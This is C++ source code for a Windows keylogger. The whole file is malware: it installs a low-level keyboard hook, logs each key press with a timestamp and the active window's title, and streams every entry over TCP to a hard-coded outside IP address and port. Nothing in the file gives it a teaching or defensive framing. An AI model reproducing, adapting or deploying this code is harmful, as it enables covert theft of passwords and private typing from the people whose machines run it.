#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#pragma comment(lib, "ws2_32")

HHOOK hKeyHook;
SOCKET WSock;

std::string getTimeStamp() {
    time_t now = time(nullptr);
    tm* ltm = localtime(&now);
    std::stringstream ss;
    ss << "[" << std::setfill('0') << std::setw(2) << ltm->tm_hour << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_min << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_sec << "] ";
    return ss.str();
}

std::string getWindowTitleUTF8() {
    wchar_t wTitle[256] = {0};
    char utf8Title[1024] = {0};
    
    GetWindowTextW(GetForegroundWindow(), wTitle, 256);
    WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, utf8Title, sizeof(utf8Title), NULL, NULL);
    
    return std::string(utf8Title);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        std::stringstream keyLog;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string specialKey;
            
            // Handle special keys
            switch (kbdStruct->vkCode) {
                case VK_RETURN: specialKey = "[ENTER]"; break;
                case VK_BACK: specialKey = "[BACKSPACE]"; break;
                case VK_TAB: specialKey = "[TAB]"; break;
                case VK_SHIFT: specialKey = "[SHIFT]"; break;
                case VK_CONTROL: specialKey = "[CTRL]"; break;
                case VK_MENU: specialKey = "[ALT]"; break;
                case VK_CAPITAL: specialKey = "[CAPS LOCK]"; break;
                case VK_ESCAPE: specialKey = "[ESC]"; break;
                case VK_SPACE: specialKey = "[SPACE]"; break;
                case VK_DELETE: specialKey = "[DEL]"; break;
                case VK_LEFT: specialKey = "[LEFT]"; break;
                case VK_RIGHT: specialKey = "[RIGHT]"; break;
                case VK_UP: specialKey = "[UP]"; break;
                case VK_DOWN: specialKey = "[DOWN]"; break;
                default: {
                    wchar_t keyNameW[64] = {0};
                    char utf8Output[256] = {0};
                    int msg = 1 + (kbdStruct->scanCode << 16) + (kbdStruct->flags << 24);
                    GetKeyNameTextW(msg, keyNameW, 64);
                    WideCharToMultiByte(CP_UTF8, 0, keyNameW, -1, utf8Output, sizeof(utf8Output), NULL, NULL);
                    specialKey = utf8Output;
                }
            }

            keyLog << getTimeStamp() 
                << "[" << getWindowTitleUTF8() << "] "
                << "Key: " << specialKey << " "
                << "VK: 0x" << std::hex << kbdStruct->vkCode << "\n";

                  
            std::string logData = keyLog.str();
            send(WSock, logData.c_str(), logData.length(), 0);
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}


int main() {
    
    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket and connect
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(6126);  
    server.sin_addr.s_addr = inet_addr("3.85.20.60");

    if (WSAConnect(WSock, (SOCKADDR*)&server, sizeof(server), nullptr, nullptr, nullptr, nullptr) == 0) {
        // Install keyboard hook
        hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);
        
        MSG msg;
        while (GetMessageA(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Cleanup
    UnhookWindowsHookEx(hKeyHook);
    closesocket(WSock);
    WSACleanup();
    
    return 0;
}
